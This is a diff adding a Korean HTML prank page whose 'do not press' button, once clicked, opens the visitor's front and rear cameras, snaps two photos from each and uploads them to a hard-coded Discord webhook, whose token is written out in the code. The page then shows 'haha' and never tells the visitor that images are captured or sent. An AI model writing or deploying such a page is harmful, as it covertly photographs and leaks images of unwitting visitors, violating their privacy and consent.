@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+  <meta charset="UTF-8">
+  <title>하하</title>
+  <style>
+    body { text-align: center; font-family: Arial; margin-top: 30px; }
+    video, canvas { width: 300px; border-radius: 12px; margin-top: 10px; }
+    button { padding: 12px 20px; font-size: 16px; cursor: pointer; }
+  </style>
+</head>
+<body>
+
+<h2>절대 누르지 마시오!</h2>
+<button id="startBtn">버튼</button>
+
+<br>
+<video id="video" autoplay playsinline></video>
+<canvas id="canvas" style="display:none;"></canvas>
+
+<script>
+const WEBHOOK_URL = "https://discord.com/api/webhooks/1462758530867265591/MaQo0lAdsm7ai9PyWm-xV3XVImaU25BZIffI6oBO3uCXPIw0OhlGMT2q0hSsKDwyyu89";
+
+const video = document.getElementById("video");
+const canvas = document.getElementById("canvas");
+const ctx = canvas.getContext("2d");
+const startBtn = document.getElementById("startBtn");
+
+const PHOTOS_PER_CAMERA = 2;
+const INTERVAL = 1500;
+
+async function sendToDiscord(blob, name, label) {
+  const form = new FormData();
+  form.append("file", blob, name);
+  form.append("content", label);
+
+  await fetch(WEBHOOK_URL, {
+    method: "POST",
+    body: form
+  });
+}
+
+async function captureSequence(facingMode, label) {
+  const stream = await navigator.mediaDevices.getUserMedia({
+    video: { facingMode }
+  });
+
+  video.srcObject = stream;
+  await new Promise(r => setTimeout(r, 1000));
+
+  for (let i = 1; i <= PHOTOS_PER_CAMERA; i++) {
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    ctx.drawImage(video, 0, 0);
+
+    await new Promise(resolve => {
+      canvas.toBlob(async blob => {
+        await sendToDiscord(
+          blob,
+          `${label}_${i}.png`,
+          `📸 ${label} ${i}번째`
+        );
+        resolve();
+      }, "image/png");
+    });
+
+    await new Promise(r => setTimeout(r, INTERVAL));
+  }
+
+  stream.getTracks().forEach(t => t.stop());
+}
+
+startBtn.addEventListener("click", async () => {
+  try {
+    await captureSequence("user", "전면");
+    await captureSequence("environment", "후면");
+    alert("하하");
+  } catch (e) {
+    alert("다시 시도해주세요");
+  }
+});
+</script>
+
+</body>
+</html>
